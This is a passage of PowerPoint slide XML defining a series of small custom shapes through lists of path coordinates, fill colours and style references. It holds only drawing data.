                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="78"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a8d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="596" name="CustomShape 212"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2612880" y="3949560"/>
            <a:ext cx="26280" cy="102600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="65">
                <a:moveTo>
                  <a:pt x="17" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bce5e5"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="597" name="CustomShape 213"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2612880" y="3951360"/>
            <a:ext cx="21600" cy="73800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="47">
                <a:moveTo>
                  <a:pt x="14" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="d1f2f2"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="598" name="CustomShape 214"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2614680" y="3952800"/>
            <a:ext cx="13680" cy="42120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="9" h="27">
                <a:moveTo>
                  <a:pt x="9" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="e5ffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="599" name="CustomShape 215"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2790720" y="4075200"/>
            <a:ext cx="21600" cy="19800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="13">
                <a:moveTo>
                  <a:pt x="7" y="13"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="8" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="13"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="600" name="CustomShape 216"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2725560" y="4075200"/>
            <a:ext cx="10440" cy="10440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7" h="7">
                <a:moveTo>
                  <a:pt x="3" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="601" name="CustomShape 217"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2744640" y="4075200"/>
            <a:ext cx="7200" cy="10440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="5" h="7">
                <a:moveTo>
                  <a:pt x="3" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="602" name="CustomShape 218"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2671920" y="3929040"/>
            <a:ext cx="29520" cy="145440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="19" h="92">
                <a:moveTo>
                  <a:pt x="6" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="92"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="3f9eff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="603" name="CustomShape 219"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2827440" y="3909960"/>
            <a:ext cx="42120" cy="162720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="27" h="103">
                <a:moveTo>
                  <a:pt x="27" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="26" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="3f9eff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="604" name="CustomShape 220"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2671920" y="3936960"/>
            <a:ext cx="27720" cy="126360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="18" h="80">
                <a:moveTo>
                  <a:pt x="6" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="78"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="59b2ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="605" name="CustomShape 221"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2673360" y="3944880"/>
            <a:ext cx="21600" cy="108720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="69">
                <a:moveTo>
                  <a:pt x="5" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="5" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="72c6ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="606" name="CustomShape 222"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2674800" y="3954600"/>
            <a:ext cx="18360" cy="88200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="56">
                <a:moveTo>
                  <a:pt x="4" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="8cd8ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="607" name="CustomShape 223"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2674800" y="3962520"/>
            <a:ext cx="15120" cy="70560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10" h="45">
                <a:moveTo>
                  <a:pt x="4" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="28"/>
